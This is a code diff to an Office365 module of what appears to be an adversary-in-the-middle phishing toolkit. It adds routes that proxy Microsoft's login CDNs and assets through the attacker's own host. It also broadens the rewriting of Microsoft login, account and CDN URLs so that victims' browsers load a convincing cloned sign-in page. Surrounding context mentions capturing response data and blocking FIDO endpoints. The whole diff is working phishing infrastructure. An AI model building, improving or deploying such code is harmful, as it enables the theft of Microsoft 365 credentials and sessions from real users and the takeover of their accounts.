@@ -32,6 +32,11 @@ class Office365Module(BaseModule):
 
         self.add_route('proxy_endpoint', '/proxy')
         self.add_route('proxy_catch_all', '/proxy/<path:path>')
+        
+        # Add routes for static resources from Microsoft domains
+        self.add_route('proxy_static_resources', '/static/<path:path>')
+        self.add_route('proxy_cdn_resources', '/cdn/<path:path>')
+        self.add_route('proxy_assets', '/assets/<path:path>')
 
         self.add_route('aitm_status', '/aitm/status')
         self.add_route('aitm_start', '/aitm/start')
@@ -681,6 +686,142 @@ class Office365Module(BaseModule):
             self.log(f"[AiTM] Catch-all proxy error: {e}")
             return redirect("https://login.microsoftonline.com/", code=302)
 
+    def proxy_static_resources(self, path):
+        """Handle static resources from Microsoft CDNs"""
+        try:
+            query_string = request.query_string.decode('utf-8')
+            
+            # Map our static routes to real Microsoft CDN domains
+            if path.startswith('aadcdn/'):
+                real_path = path.replace('aadcdn/', '', 1)
+                target_url = f"https://aadcdn.msftauth.net/{real_path}"
+            elif path.startswith('logincdn/'):
+                real_path = path.replace('logincdn/', '', 1)
+                target_url = f"https://logincdn.msftauth.net/{real_path}"
+            elif path.startswith('memgfx/'):
+                real_path = path.replace('memgfx/', '', 1)
+                target_url = f"https://mem.gfx.ms/{real_path}"
+            elif path.startswith('sms/'):
+                real_path = path.replace('sms/', '', 1)
+                target_url = f"https://c.s-microsoft.com/{real_path}"
+            elif path.startswith('spo/'):
+                real_path = path.replace('spo/', '', 1)
+                target_url = f"https://static2.sharepointonline.com/{real_path}"
+            else:
+                # Default to AAD CDN
+                target_url = f"https://aadcdn.msftauth.net/{path}"
+            
+            if query_string:
+                target_url += f"?{query_string}"
+            
+            self.log(f"[AiTM] Proxying static resource: {target_url}")
+            
+            # Proxy the static resource
+            return self._proxy_static_resource(target_url)
+            
+        except Exception as e:
+            self.log(f"[AiTM] Static resource proxy error: {e}")
+            from flask import Response
+            return Response('', status=404)
+
+    def proxy_cdn_resources(self, path):
+        """Handle CDN resources"""
+        try:
+            query_string = request.query_string.decode('utf-8')
+            target_url = f"https://aadcdn.msftauth.net/{path}"
+            
+            if query_string:
+                target_url += f"?{query_string}"
+            
+            self.log(f"[AiTM] Proxying CDN resource: {target_url}")
+            return self._proxy_static_resource(target_url)
+            
+        except Exception as e:
+            self.log(f"[AiTM] CDN resource proxy error: {e}")
+            from flask import Response
+            return Response('', status=404)
+
+    def proxy_assets(self, path):
+        """Handle asset resources"""
+        try:
+            query_string = request.query_string.decode('utf-8')
+            target_url = f"https://login.microsoftonline.com/assets/{path}"
+            
+            if query_string:
+                target_url += f"?{query_string}"
+            
+            self.log(f"[AiTM] Proxying asset resource: {target_url}")
+            return self._proxy_static_resource(target_url)
+            
+        except Exception as e:
+            self.log(f"[AiTM] Asset resource proxy error: {e}")
+            from flask import Response
+            return Response('', status=404)
+
+    def _proxy_static_resource(self, target_url):
+        """Proxy static resources (CSS, JS, images, fonts) without modification"""
+        try:
+            import requests
+            from flask import Response, request as flask_request
+            
+            # Forward headers for static resources
+            headers = {}
+            for key, value in flask_request.headers:
+                if key.lower() not in ['host', 'content-length']:
+                    headers[key] = value
+            
+            # Set appropriate headers for static resources
+            headers['User-Agent'] = flask_request.headers.get('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
+            headers['Accept'] = flask_request.headers.get('Accept', '*/*')
+            headers['Accept-Encoding'] = 'gzip, deflate'
+            headers['Cache-Control'] = 'max-age=3600'
+            
+            # Make request to get static resource
+            resp = requests.get(target_url, headers=headers, timeout=30)
+            
+            # Prepare response headers
+            response_headers = {}
+            for key, value in resp.headers.items():
+                if key.lower() not in ['content-encoding', 'transfer-encoding', 'connection']:
+                    response_headers[key] = value
+            
+            # For CSS files, we might need to rewrite URLs inside them
+            content = resp.content
+            if resp.headers.get('content-type', '').startswith('text/css'):
+                try:
+                    css_content = content.decode('utf-8', errors='ignore')
+                    current_host = flask_request.host
+                    
+                    # Rewrite URLs in CSS files
+                    css_replacements = [
+                        ('https://aadcdn.msftauth.net/', f'https://{current_host}/static/aadcdn/'),
+                        ('https://logincdn.msftauth.net/', f'https://{current_host}/static/logincdn/'),
+                        ('//aadcdn.msftauth.net/', f'//{current_host}/static/aadcdn/'),
+                        ('//logincdn.msftauth.net/', f'//{current_host}/static/logincdn/'),
+                    ]
+                    
+                    for old_url, new_url in css_replacements:
+                        css_content = css_content.replace(old_url, new_url)
+                    
+                    content = css_content.encode('utf-8')
+                    response_headers['Content-Length'] = str(len(content))
+                    
+                except Exception as e:
+                    self.log(f"[AiTM] CSS rewriting error: {e}")
+            
+            # Create Flask response for static resource
+            flask_response = Response(
+                content,
+                status=resp.status_code,
+                headers=response_headers
+            )
+            
+            return flask_response
+            
+        except Exception as e:
+            self.log(f"[AiTM] Static resource proxy error: {e}")
+            return Response('', status=404)
+
     def _proxy_to_microsoft(self, target_url):
         """Proxy the request to Microsoft and capture response data"""
         try:
@@ -805,19 +946,43 @@ class Office365Module(BaseModule):
                     # FIDO endpoint blocking is now handled earlier in _proxy_to_microsoft()
                     # This section now only handles URL rewriting for normal content
                     
-                    # Replace Microsoft URLs with our proxy URLs
+                    # Comprehensive URL rewriting for ALL Microsoft resources
                     replacements = [
+                        # Main Microsoft login domains
                         ('https://login.microsoftonline.com/', f'https://{current_host}/proxy/'),
                         ('https://login.live.com/', f'https://{current_host}/proxy/'),
                         ('https://login.microsoft.com/', f'https://{current_host}/proxy/'),
+                        ('https://account.live.com/', f'https://{current_host}/proxy/'),
+                        ('https://account.microsoft.com/', f'https://{current_host}/proxy/'),
+                        
+                        # Static resource CDNs and asset domains
+                        ('https://aadcdn.msftauth.net/', f'https://{current_host}/static/aadcdn/'),
+                        ('https://aadcdn.msauth.net/', f'https://{current_host}/static/aadcdn/'),
+                        ('https://logincdn.msftauth.net/', f'https://{current_host}/static/logincdn/'),
+                        ('https://secure.aadcdn.microsoftonline-p.com/', f'https://{current_host}/static/aadcdn/'),
+                        ('https://mem.gfx.ms/', f'https://{current_host}/static/memgfx/'),
+                        ('https://c.s-microsoft.com/', f'https://{current_host}/static/sms/'),
+                        ('https://static2.sharepointonline.com/', f'https://{current_host}/static/spo/'),
+                        ('https://spoprod-a.akamaihd.net/', f'https://{current_host}/static/spo/'),
+                        
+                        # JavaScript/CSS references in quotes
                         ('"https://login.microsoftonline.com', f'"https://{current_host}/proxy'),
                         ("'https://login.microsoftonline.com", f"'https://{current_host}/proxy"),
                         ('"https://login.live.com', f'"https://{current_host}/proxy'),
                         ("'https://login.live.com", f"'https://{current_host}/proxy"),
                         ('"https://login.microsoft.com', f'"https://{current_host}/proxy'),
                         ("'https://login.microsoft.com", f"'https://{current_host}/proxy"),
-                        ('https://account.live.com/', f'https://{current_host}/proxy/'),
-                        ('https://account.microsoft.com/', f'https://{current_host}/proxy/'),
+                        ('"https://aadcdn.msftauth.net', f'"https://{current_host}/static/aadcdn'),
+                        ("'https://aadcdn.msftauth.net", f"'https://{current_host}/static/aadcdn"),
+                        ('"https://logincdn.msftauth.net', f'"https://{current_host}/static/logincdn'),
+                        ("'https://logincdn.msftauth.net", f"'https://{current_host}/static/logincdn"),
+                        
+                        # Relative URLs that might reference Microsoft domains
+                        ('//login.microsoftonline.com/', f'//{current_host}/proxy/'),
+                        ('//login.live.com/', f'//{current_host}/proxy/'),
+                        ('//login.microsoft.com/', f'//{current_host}/proxy/'),
+                        ('//aadcdn.msftauth.net/', f'//{current_host}/static/aadcdn/'),
+                        ('//logincdn.msftauth.net/', f'//{current_host}/static/logincdn/'),
                     ]
                     
                     for old_url, new_url in replacements:
